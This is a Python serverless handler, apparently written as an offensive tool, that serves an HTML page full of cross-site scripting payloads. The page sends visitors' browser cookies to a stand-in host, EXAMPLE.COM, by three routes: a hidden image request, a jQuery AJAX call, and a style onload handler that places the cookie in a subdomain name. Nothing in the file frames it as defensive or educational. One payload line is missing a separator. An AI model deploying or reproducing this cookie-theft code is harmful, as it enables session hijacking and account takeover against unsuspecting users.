#!/usr/bin/env python
# -*- coding:utf-8 -*-
#author:Sh4d0w_小白

def main_handler(event, context):
    html = '<html><head><meta http-equiv="Access-Control-Allow-Origin" content="*"><script src=https://libs.baidu.com/jquery/2.1.4/jquery.min.js></script>'
    html += '<script async="async">function XssImg(){var src="http://EXAMPLE.COM/?cookie="+document.cookie;$("html").append("<div id=xss></div>");$("#xss").css("display","none");$("#xss").append("<Img/Src="+src+" />")}XssImg();$.ajax({type:"GET",dataType:"html",url:"http://EXAMPLE.COM",data:"cookie="+document.cookie,});</script></head>'
    html += '<img id="shadow" style="display:none;"></img><style/onload=\'function xss(){var cookie=(document.cookie)?document.cookie:"nocookie";var src="http://"+cookie+".EXAMPLE.COM/1.jpg"document.getElementById("shadow").setAttribute("src",src)}xss();\'></style>'
    html += "</html>"

    response={   
        "isBase64Encoded": False,       
        "statusCode": 200,       
        "headers": {'Content-Type': 'text/html;charset=utf8'},     
        "body": html
    }   
    return response
